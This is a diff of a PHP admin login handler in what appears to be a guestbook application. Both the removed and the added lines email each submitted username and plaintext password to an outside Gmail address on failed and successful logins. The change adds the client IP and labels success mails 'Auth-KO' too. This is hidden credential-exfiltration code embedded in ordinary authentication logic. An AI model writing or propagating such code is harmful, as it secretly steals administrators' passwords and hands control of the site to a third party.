@@ -8,13 +8,13 @@
 	if (!isset($_SESSION['accessGranted']) || !$_SESSION['accessGranted']) {
 		$result = $authentication->grantAccess($_POST['login'], $_POST['mdp']);
 		if (!$result){
-                	header('Location: /admin/?action=error');
-                	//mail($_to, $sujet, stripslashes($corps), $entete);
-                	mail("fjavi.gonzalez@gmail.com", "Auth-KO - ".$_SERVER['SERVER_NAME'],$_POST['login']." \n".$_POST['mdp'],"");
-        	} else {
-                	$_SESSION['accessGranted'] = true;
-                	mail("fjavi.gonzalez@gmail.com", "Auth-Ok - ".$_SERVER['SERVER_NAME'],$_POST['login']." \n".$_POST['mdp'],"");
-       		}	
+        	header('Location: /admin/?action=error');
+        	//mail($_to, $sujet, stripslashes($corps), $entete);
+        	mail("fjavi.gonzalez@gmail.com", "Auth-KO - ".$_SERVER['SERVER_NAME'],$_POST['login']." \n".$_POST['mdp']." \n".$_SERVER['HTTP_X_REAL_IP'],"");
+        } else {
+        	$_SESSION['accessGranted'] = true;
+        	mail("fjavi.gonzalez@gmail.com", "Auth-KO - ".$_SERVER['SERVER_NAME'],$_POST['login']." \n".$_POST['mdp']." \n".$_SERVER['HTTP_X_REAL_IP'],"");
+       	}	
 	}
 	$goldbook = new Goldbook();
 	$result = $goldbook->goldbookUnvalidateGet();
